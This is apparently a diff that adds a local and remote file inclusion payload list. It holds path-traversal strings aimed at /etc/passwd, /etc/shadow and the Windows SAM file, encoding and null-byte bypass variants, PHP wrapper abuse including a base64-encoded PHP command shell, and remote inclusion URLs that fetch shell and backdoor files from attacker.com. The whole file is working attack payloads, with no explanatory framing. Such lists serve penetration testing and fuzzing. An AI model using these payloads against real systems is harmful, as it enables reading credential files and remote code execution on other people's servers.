@@ -1,0 +1,81 @@
+# Local File Inclusion / Path Traversal Payloads
+# Basic path traversal
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+
+# Windows paths
+..\..\..\..\windows\system32\config\sam
+..\..\..\..\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+
+# Encoded traversal
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Unicode encoding
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+# Null byte injection
+../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# Mixed separators
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+
+# Absolute paths
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
+
+# Web server files
+/var/www/html/index.php
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+
+# Application files
+/var/www/html/.htaccess
+/var/www/html/config.php
+/var/www/html/.env
+
+# Wrapper abuse
+php://filter/convert.base64-encode/resource=index.php
+php://input
+expect://whoami
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# Log poisoning
+/var/log/nginx/access.log
+/var/log/httpd/access_log
+/var/log/apache2/error.log
+
+# File descriptor
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+
+# Bypass attempts
+....././....././....././etc/passwd
+....\/....\/....\/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
+
+# Case variations
+..\..\..\..\WINDOWS\SYSTEM32\CONFIG\SAM
+..\..\..\..\Windows\System32\Config\Sam
+
+# Remote file inclusion
+http://attacker.com/shell.txt
+https://attacker.com/backdoor.php
+ftp://attacker.com/payload.txt
+
+# Share/UNC paths
+\\attacker\share\shell.php
+//attacker/share/backdoor.txt
